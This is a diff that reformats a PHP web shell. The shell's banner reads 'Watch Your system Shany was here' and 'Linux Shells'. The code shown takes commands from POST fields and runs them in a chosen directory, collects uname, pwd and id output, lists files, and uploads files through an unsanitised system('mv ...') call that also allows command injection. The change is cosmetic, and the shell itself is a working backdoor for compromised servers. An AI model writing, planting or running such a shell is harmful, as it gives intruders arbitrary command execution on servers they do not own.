@@ -9,14 +9,14 @@ print "<center><h1>Watch Your system Shany was here.</h1></center>";
 print "<center><h1>Linux Shells</h1></center>";
 print "<hr><hr>";
 
-$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
-$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
+$currentWD  = str_replace("\\\\", "\\", $_POST['_cwd']);
+$currentCMD = str_replace("\\\\", "\\", $_POST['_cmd']);
 
 $UName  = `uname -a`;
 $SCWD   = `pwd`;
 $UserID = `id`;
 
-if( $currentWD == "" ) {
+if ($currentWD == "") {
     $currentWD = $SCWD;
 }
 
@@ -29,7 +29,7 @@ print "</table>";
 
 print "<hr><hr>";
 
-if( $_POST['_act'] == "List files!" ) {
+if ($_POST['_act'] == "List files!") {
     $currentCMD = "ls -la";
 }
 
@@ -46,17 +46,17 @@ print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";
 
 print "</table></form><hr><hr>";
 
-$currentCMD = str_replace("\\\"","\"",$currentCMD);
-$currentCMD = str_replace("\\\'","\'",$currentCMD);
+$currentCMD = str_replace("\\\"", "\"", $currentCMD);
+$currentCMD = str_replace("\\\'", "\'", $currentCMD);
 
-if( $_POST['_act'] == "Upload!" ) {
-    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
+if ($_POST['_act'] == "Upload!") {
+    if ($_FILES['_upl']['error'] != UPLOAD_ERR_OK) {
         print "<center><b>Error while uploading file!</b></center>";
     } else {
         print "<center><pre>";
         system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
         print "</pre><b>File uploaded successfully!</b></center>";
-    }    
+    }
 } else {
     print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
     $currentCMD = "cd ".$currentWD.";".$currentCMD;
@@ -65,5 +65,3 @@ if( $_POST['_act'] == "Upload!" ) {
 }
 
 exit;
-
-?>
